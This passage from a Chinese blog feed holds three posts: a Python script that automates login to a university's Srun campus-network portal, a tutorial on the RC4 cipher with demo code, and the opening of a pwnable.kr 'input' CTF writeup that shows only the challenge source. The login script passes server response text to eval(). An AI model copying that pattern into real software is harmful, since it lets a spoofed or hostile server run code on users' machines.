class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>逻辑这么分析到位了之后接下来就开始写两次抓包的脚本吧，这里也直接给了，毕竟逻辑就真的这么点，主要的工作量都在js转python上面，而已经有人转好了我就直接拿过来用了，这里再次鸣谢huxiaofan1223大佬，本篇博客也贴在上面的传送门当中了。</p><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">chkstr = token+username</span><br><span class="line">chkstr += token+hmd5</span><br><span class="line">chkstr += token+ac_id</span><br><span class="line">chkstr += token+ip</span><br><span class="line">chkstr += token+n</span><br><span class="line">chkstr += token+<span class="built_in">type</span></span><br><span class="line">chkstr += token+i</span><br><span class="line"><span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">info_temp=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:password,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line"><span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">&#125;</span><br><span class="line">i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line"><span class="keyword">global</span> ip</span><br><span class="line">init_res=requests.get(init_url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;初始化获取ip&quot;</span>)</span><br><span class="line"><span class="comment">#print(init_res.text)</span></span><br><span class="line">ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line"><span class="comment"># print(&quot;获取token&quot;)</span></span><br><span class="line"><span class="keyword">global</span> token</span><br><span class="line">get_challenge_params=&#123;</span><br><span class="line"><span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">&#125;</span><br><span class="line">get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token为:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line"><span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">i=get_info()</span><br><span class="line">i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">hmd5=get_md5(password,token)</span><br><span class="line">chksum=get_sha1(get_chksum())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有加密工作已完成&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">srun_portal_params=&#123;</span><br><span class="line"><span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line"><span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line"><span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line"><span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line"><span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line"><span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line"><span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#输出错误信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">global</span> username,password</span><br><span class="line">username=<span class="string">&quot;&quot;</span><span class="comment">#你的用户名和密码，注意加上@cmcc(移动) 或者@chinanet(电信)，联通是啥就忘了。。</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">init_getip()</span><br><span class="line">get_token()</span><br><span class="line">do_complex_work()</span><br><span class="line">login()</span><br></pre></td></tr></table></figure><p>本学生来自嘉兴学院，同校校友可以换上自己的用户名和密码直接用，如果不是的话把url替换一下应该问题也不大。</p><p>以后上网终于不用再输用户名密码了，只能说爽(狗头</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>RC4加密的学习</title>
    <link href="http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-27T02:00:00.000Z</published>
    <updated>2021-11-27T14:12:31.491Z</updated>
    
    <content type="html"><![CDATA[<p>最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4</p><span id="more"></span><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>我初识RC4是在国赛，记得很清楚的一点就是不停地取模256，那题当时靠着网上资料勉强算过去了。但是还是想系统地学一下，网上教程千篇一律，我决定自己模拟一边它的算法过程然后再理解一遍。</p><p>既然是加密，脱离不了三个概念，明文，密文，密钥。RC4是对称加密，我也才知道，一直以为是不可逆的那种hash加密，所以既然它是对称加密，那么对于加密和解密过程，他们所用的密钥相同。它生成密钥的过程如下：</p><p>生成密钥需要一个长度不多于256长度的字符串作为种子生成随机密钥，这是我自己的理解，因为它确实给我的感觉就是这样的随机。它初始生成了一个长度为256的S串，初始S[i]=i，后面根据用字符串种子作为一个变换规则T，交换S密钥里的各个值，这样的交换好处在于我们可以保证S串密钥为一个双射（满足单射和满射，这个概念高中应该讲过，不赘述）。然后给的一个字符串种子呢，就会被放进T中，T的长度也为256，如果所给字符串种子长度小于256，则会进行轮换，直到它长度严格等于256为止。举个例子，在RC4加密中，如果我给定字符串种子为abcd，那么T的值将是[‘a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,……’a’,’b’,’c’,’d’]，对于任意0&lt;=i&lt;256，</p><p>T[i]=Seed[i%len(Seed)]</p><p>那么有了这个T之后呢，我们可以开始进行密钥变换了，做以下规则的变换(字符串均转成ASCII码计算)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>从这一步我们也可以看出来，S初值我们都是知道的，T在确定了字符串种子之后也是确定的，那么由此可以算出密钥S。我们平时习惯说那个字符串是密钥，但是从这里可以看出来，字符串只是用来确定密钥的，因为在这之后，T和给的字符串已经都用不到了。所以这也是我为什么说那个字符串是种子而不是密钥，因为它没有参与加密的运算，我们刚刚算的那么快乐压根都没有出现明文这种，没有明文怎么能算加密呢对吧。</p><p>最后我们看看它是如何加密的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>有木有感觉很熟悉，跟前面生成密钥的算法差不多。这个算法如果不了解RC4，直接逆上去的话，怕能直接破防。我有体会我给你们演示一遍，首先i初值知道，c[k]知道，然后要算明文的话m[k]=c[k]^S[(S[i]+S[j])%256]然后呢，i最终值不知道，j最终值不知道，就，时间静止了呗。但是其实它最后就做一个异或，就不用管它了呗，跟它一样从头往后再异或一遍，不就回来了吗。这也就是它为什么也叫对称加密，它不仅密钥用的是一个，加密解密算法都是一样的，没错，加密即解密。RC4解密只需要对密文再加密一次就可以得到明文了。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>把它放到CyberChef中加密发现结果一致，本次可能说就是学了个寂寞吧，因为我最后只要知道它加密解密算法一致这个结论就可以了。但是最重要的还是学会了如何分辨这样的加解密以及它加解密的一个特性，也算小有成就吧，瞬间不emo了哈哈哈哈。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnable input writeup</title>
    <link href="http://example.com/2021/11/23/pwnable_input/"/>
    <id>http://example.com/2021/11/23/pwnable_input/</id>
    <published>2021-11-23T02:00:00.000Z</published>
    <updated>2021-11-23T04:53:35.245Z</updated>
    
    <content type="html"><![CDATA[<p>真的推荐学linux C的IO一定得做做这个，真的能学到很多。</p><span id="more"></span><p>连接远程服务器把源码下下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span 